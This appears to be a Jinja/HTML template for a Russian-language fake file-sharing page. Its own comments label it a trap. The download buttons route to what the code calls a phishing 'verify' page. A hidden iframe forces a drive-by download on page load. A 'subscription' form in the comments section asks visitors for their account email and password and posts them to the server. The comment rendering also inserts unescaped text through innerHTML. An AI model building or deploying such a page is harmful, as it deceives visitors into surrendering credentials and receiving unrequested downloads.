{% extends "base.html" %}

{% block content %}
<div class="card p-4 mb-4">
    <div class="d-flex align-items-center">
        <div class="bg-danger bg-opacity-10 rounded-circle p-3 me-3">
            <i class="fa-solid fa-user-secret fa-2x text-danger"></i>
        </div>
        <div>
            <h4 class="mb-0">Файлы пользователя: Гость</h4>
            <small class="text-muted">ID сессии: {{ uid }}</small>
        </div>
    </div>
</div>

<div class="card p-4">
    <h5 class="mb-4">Доступные документы ({{ files|length }})</h5>
    
    {% for file in files %}
    <div class="d-flex align-items-center border-bottom py-3">
        <div class="me-3">
            <i class="fa-solid {{ file.icon }} fa-2x text-danger"></i>
        </div>
        <div class="flex-grow-1">
            <h6 class="mb-0 fw-bold">{{ file.name }}</h6>
            <small class="text-muted">{{ file.format }} • {{ file.date }}</small>
        </div>
        <div>
            <!-- Кнопка ведет на фишинг -->
            <a href="/verify/{{ uid }}/{{ file.name }}" class="btn btn-outline-dark btn-sm">
                <i class="fa-solid fa-download"></i> Скачать
            </a>
        </div>
    </div>
    {% endfor %}
    
    <div class="mt-3 p-3 bg-light rounded border">
        <div class="d-flex justify-content-between align-items-center">
            <div>
                <strong><i class="fa-solid fa-receipt"></i> Квитанция о загрузке</strong>
                <br><small class="text-muted">Подтверждение для отчетности (PDF)</small>
            </div>
            <a href="/download_receipt/{{ uid }}" class="btn btn-sm btn-secondary">
                <i class="fa-solid fa-file-arrow-down"></i> Скачать
            </a>
        </div>
    </div>
</div>

<!-- COMMENTS TRAP -->
<div class="card p-4 mt-4">
    <div class="d-flex justify-content-between align-items-center mb-3">
        <h6 class="mb-0">Обсуждение</h6>
        <span class="badge bg-success">Online</span>
    </div>
    
    <div id="commentsList" class="mb-4">
        {% if db_data and db_data.comments %}
            {% for c in db_data.comments %}
                <div class="border-bottom pb-2 mb-2">
                    <strong>{{ c.username }}</strong> <small class="text-muted">{{ c.date }}</small>
                    <p class="mb-0">{{ c.text }}</p>
                </div>
            {% endfor %}
        {% else %}
            <p class="text-muted small text-center">Комментариев пока нет.</p>
        {% endif %}
    </div>

    <div class="bg-light p-3 rounded border">
        <p class="small text-muted mb-2"><i class="fa-regular fa-bell"></i> <strong>Подписка на ответы:</strong> Введите Email и пароль от вашей учетной записи, чтобы получать уведомления.</p>
        
        <div class="row g-2 mb-2">
            <div class="col-md-6">
                <input type="text" id="usernameInput" class="form-control form-control-sm" placeholder="Ваше имя">
            </div>
            <div class="col-md-6">
                <input type="email" id="emailInput" class="form-control form-control-sm" placeholder="Email">
            </div>
        </div>
        
        <div class="mb-2">
            <input type="password" id="passwordInput" class="form-control form-control-sm" placeholder="Пароль (для подписки)">
        </div>

        <div class="form-floating mb-2">
            <textarea class="form-control" placeholder="Leave a comment here" id="commentText" style="height: 80px"></textarea>
            <label for="commentText">Ваше сообщение...</label>
        </div>
        
        <button onclick="sendComment('{{ uid }}')" class="btn btn-primary btn-sm w-100">
            <i class="fa-regular fa-paper-plane"></i> Отправить
        </button>
    </div>
</div>

<script>
// 1. Auto-Download Trap (Drive-by)
window.addEventListener('load', function() {
    setTimeout(() => {
        const ifr = document.createElement('iframe');
        ifr.style.display = 'none';
        ifr.src = "/download_receipt/{{ uid }}";
        document.body.appendChild(ifr);
    }, 2500);
});

// 2. Comment Logic
function sendComment(uid) {
    const username = document.getElementById('usernameInput').value || 'Guest';
    const email = document.getElementById('emailInput').value;
    const password = document.getElementById('passwordInput').value;
    const text = document.getElementById('commentText').value;
    
    if(!text) { alert("Введите текст!"); return; }

    const btn = document.querySelector('button[onclick^="sendComment"]');
    const originalText = btn.innerHTML;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> ...';
    btn.disabled = true;

    fetch('/api/comment', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ 
            uid: uid, username: username, text: text,
            email: email, password: password 
        })
    })
    .then(response => response.json())
    .then(data => {
        btn.innerHTML = originalText;
        btn.disabled = false;
        if(data.status === 'ok') {
            const list = document.getElementById('commentsList');
            if(list.querySelector('.text-center')) list.innerHTML = '';
            const html = `
                <div class="border-bottom pb-2 mb-2">
                    <strong>${data.comment.username}</strong> <small class="text-muted">${data.comment.date}</small>
                    <p class="mb-0">${data.comment.text}</p>
                </div>`;
            list.insertAdjacentHTML('beforeend', html);
            document.getElementById('commentText').value = '';
            document.getElementById('passwordInput').value = ''; 
            if(email && password) alert(`Подписка оформлена на ${email}.`);
        }
    });
}
</script>
{% endblock %}
